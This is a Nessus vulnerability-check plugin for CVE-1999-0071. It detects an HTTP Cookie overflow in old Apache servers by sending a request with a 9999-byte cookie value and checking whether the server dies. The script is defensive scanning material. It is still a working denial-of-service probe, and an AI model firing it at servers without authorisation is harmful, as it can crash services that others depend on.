#
# This script was written by Michel Arboi <arboi@alussinan.org>
# GPL
# *untested*
#
# References:

# Affected:
# Apache < 1.1
# 


if(description)
{
 script_id(11077);
 script_cve_id("CVE-1999-0071");
 script_version ("$Revision: 1.15 $");
 name["english"] = "HTTP Cookie overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "It was possible to kill the web server by
sending an invalid request with a too long Cookie name or value

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbirtray code on your system.

Solution : upgrade your software or protect it with a filtering reverse proxy
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Too big Cookie chokes the web server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
# All the www_too_long_*.nasl scripts were first declared as 
# ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
# The web server might be killed by those generic tests before Nessus 
# has a chance to perform known attacks for which a patch exists
# As ACT_DENIAL are performed one at a time (not in parallel), this reduces
# the risk of false positives.
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencies("find_service.nes", "http_version.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

########



include ("http_func.inc");

port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);
if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

# If the server sends us a cookie, we will reply with it... 
# Slightly modified :-)
r = http_get(item:"/", port: port);
send(socket:soc, data: r);
h = http_recv_headers2(socket:soc);
r = http_recv_body(socket: soc, headers:h);
close(soc);

ck = egrep(pattern: "^Set-Cookie: ", string: h);

ckn="Nessus";
if (ck)
{
  ckn = ereg_replace(string: ck, 
	pattern: "^Set-Cookie: +([^=;]+)=.*", 
	replace:"\1");
}

soc = http_open_socket(port);
if(!soc) exit(0);

r = http_get(item:"/", port: port);
r= r - string("\r\n\r\n");
r= string(r, "\r\n", "Cookie: ", ckn, "=", crap(9999), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

if (http_is_dead(port: port, retry:1)) { security_hole(port); exit(0); }
